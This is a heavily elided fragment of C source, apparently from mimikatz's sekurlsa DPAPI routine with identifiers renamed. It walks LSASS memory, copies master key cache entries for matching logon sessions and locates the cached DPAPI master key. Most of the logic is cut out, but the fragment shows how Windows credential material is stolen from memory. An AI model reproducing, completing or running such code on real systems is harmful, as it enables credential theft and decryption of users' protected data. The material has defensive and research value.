...
PMANGO_MASTERKEY_CACHE_ENTRY pMasterKeyCacheList = NULL;
...
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PMANGO_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	...
	if(pData->LogonType != Network)
	{
		...
		if(pPackage->Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &pPackage->Module, MasterKeyCacheReferences, ARRAYSIZE(MasterKeyCacheReferences), (PVOID *) &pMasterKeyCacheList, NULL, NULL, NULL))
		{
			...
			if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(LIST_ENTRY)))
			{
				...
				{
					if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(MANGO_MASTERKEY_CACHE_ENTRY)))
					{
						if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId))
						{
							...
							{
								aLsass.address = (PBYTE) aLsass.address + FIELD_OFFSET(MANGO_MASTERKEY_CACHE_ENTRY, key);
